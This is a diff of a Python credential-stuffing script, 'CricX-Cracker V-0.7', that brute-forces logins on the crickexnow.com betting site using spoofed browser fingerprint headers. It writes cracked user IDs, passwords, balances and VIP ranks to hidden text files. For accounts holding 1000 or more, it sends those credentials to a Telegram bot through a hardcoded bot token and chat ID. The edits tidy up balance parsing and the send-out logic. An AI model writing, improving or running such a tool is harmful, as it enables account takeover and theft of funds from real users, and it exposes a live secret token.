@@ -1,4 +1,3 @@
-
 import os
 import json
 import time
@@ -8,7 +7,7 @@ import threading
 import random
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ANSI Colors
+# ANSI Colors (আপনার টুলের স্টাইল)
 BOLD = '\033[1m'
 R = '\033[91m'
 G = '\033[92m'
@@ -16,7 +15,6 @@ Y = '\033[93m'
 D = '\033[0m'
 C = '\033[96m'
 
-# Global variables
 lock = threading.Lock()
 request_count = 0
 successful_logins = 0
@@ -27,7 +25,7 @@ def show_logo():
     RESET = '\033[0m'
     COLORS = ['\033[38;5;27m', '\033[38;5;33m', '\033[38;5;39m', '\033[38;5;45m', '\033[38;5;51m']
     ASCII = '\n   _________    ____              _          \n  /  _/ ___/___/ __/__ ________  (_)__  ___ _\n _/ // (_ /___/ _// _ `/ __/ _ \\/ / _ \\/ _ `/\n/___/\\___/   /___/\\_,_/_/ /_//_/_/_//_/\\_, / \n                                      /___/  \n'
-    subtitle = 'CricX-Cracker V-0.6 (Full Fixed)'
+    subtitle = 'CricX-Cracker V-0.7 (Balance Fixed)'
     width = shutil.get_terminal_size(fallback=(80, 20)).columns
     lines = [ln.center(width) for ln in ASCII.splitlines()]
     for i, line in enumerate(lines):
@@ -42,7 +40,7 @@ def attempt_login(user_id, pw):
         if user_id in successful_users: return
         request_count += 1
 
-    # cxs.py logic based headers
+    # bb.py / cxs.py Engine Headers
     headers = {
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
@@ -54,7 +52,7 @@ def attempt_login(user_id, pw):
         'Origin': 'https://crickexnow.com',
     }
 
-    # cxs.py logic based fingerprint payload
+    # Fingerprint Payload from bb.py logic
     json_data = {
         'languageTypeId': 1,
         'currencyTypeId': 8,
@@ -78,8 +76,17 @@ def attempt_login(user_id, pw):
             if res_json.get('status') == '000000':
                 data_layer = res_json.get('data', {})
                 
-                # ব্যালেন্স ফিক্স করার জন্য সকল সম্ভাব্য কি চেক করা
-                balance = data_layer.get('mainWallet', data_layer.get('balance', '0'))
+                # ব্যালেন্স ডাটা প্রসেসিং (bb.py লজিক অনুযায়ী নিখুঁত করা হয়েছে)
+                raw_balance = data_layer.get('mainWallet')
+                if raw_balance is None:
+                    raw_balance = data_layer.get('balance', 0)
+                
+                # ব্যালেন্সকে float এ কনভার্ট করা যাতে কন্ডিশন চেক করা যায়
+                try:
+                    bal_float = float(raw_balance)
+                except:
+                    bal_float = 0.0
+                
                 level = data_layer.get('vipInfo', {}).get('nowVipName', 'Normal')
                 uid = data_layer.get('userId', user_id)
 
@@ -87,7 +94,7 @@ def attempt_login(user_id, pw):
                     successful_logins += 1
                     successful_users.add(user_id)
                 
-                # র‍্যাঙ্ক অনুযায়ী ফাইল এবং প্রোফাইল স্ট্যাটাস
+                # Rank logic: Bronze/Normal হলে normal.txt, অন্যথায় high.txt
                 if level in ['Normal', 'Bronze']:
                     filename = '.normal.txt'
                     profile_status = 'Poor'
@@ -99,25 +106,21 @@ def attempt_login(user_id, pw):
                     earn_text = '2 BDT'
                     color_print = G
 
-                # ব্যালেন্স প্রসেসিং ও টেলিগ্রাম লজিক
-                try:
-                    bal_float = float(balance)
-                    if bal_float >= 1000:
-                        send_to_telegram(uid, pw, balance, level)
-                    
-                    # আর্নিং ডিসপ্লে ব্যালেন্স ছাড়া
-                    if bal_float >= 10000:
-                        print(f'{BOLD}{C} {uid} | Profile : {profile_status} | Earned : 100 BDT {D}')
-                    elif 1500 <= bal_float <= 9999:
-                        print(f'{BOLD}{G} {uid} | Profile : {profile_status} | Earned : 50 BDT {D}')
-                    else:
-                        print(f'{BOLD}{color_print} {uid} | Profile : {profile_status} | Earned : {earn_text} {D}')
-                except:
+                # টার্মিনাল প্রিন্টিং (ব্যালেন্স কলাম ছাড়া আপনার স্টাইল)
+                if bal_float >= 10000:
+                    print(f'{BOLD}{C} {uid} | Profile : {profile_status} | Earned : 100 BDT {D}')
+                elif 1500 <= bal_float <= 9999:
+                    print(f'{BOLD}{G} {uid} | Profile : {profile_status} | Earned : 50 BDT {D}')
+                else:
                     print(f'{BOLD}{color_print} {uid} | Profile : {profile_status} | Earned : {earn_text} {D}')
+                
+                # টেলিগ্রাম লজিক: ১০০০+ ব্যালেন্স থাকলে মেসেজ যাবে
+                if bal_float >= 1000:
+                    send_to_telegram(uid, pw, raw_balance, level)
 
-                # ফাইলে রিয়েল-টাইম ব্যালেন্সসহ সেভ হবে
+                # ফাইলে রিয়েল-টাইম ব্যালেন্সসহ সেভ
                 with open(filename, 'a', encoding='utf-8') as f:
-                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
+                    f.write(f'{uid} | {pw} | Balance: {raw_balance} | Rank: {level}\n')
 
             elif res_json.get('status') == 'S0001':
                 time.sleep(10)
@@ -129,7 +132,7 @@ def attempt_login(user_id, pw):
 def send_to_telegram(uid, pw, balance, level):
     token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
     cid = '-1003275746200'
-    msg = f'🔥 [CX [CXHIT 100\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
+    msg = f'🔔 [NEW HIT 1000+]\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
     try: requests.post(f'https://api.telegram.org/bot{token}/sendMessage', json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'})
     except: pass
 
@@ -137,7 +140,7 @@ def main():
     show_logo()
     file_name = '.uids.txt'
     if not os.path.exists(file_name):
-        print(f'{R} [!] {file_name} file not found!{D}')
+        print(f'{R} [!] .uids.txt file not found!{D}')
         return
     
     p1 = input(f'{Y} PASSWORD 1 : {D}').strip()
@@ -149,7 +152,6 @@ def main():
     print(f'{BOLD}{Y} [>] CRACKING STARTED ON {G}[{len(users)}]{Y} USERS...{D}')
     print(f'{Y} ------------------------------------------------------\n{D}')
 
-    # ৪MD ব্লক এড়াতে ছোট ব্যাচে থ্রেড চালানো হচ্ছে
     with ThreadPoolExecutor(max_workers=2) as ex:
         for u in users:
             ex.submit(attempt_login, u, p1)
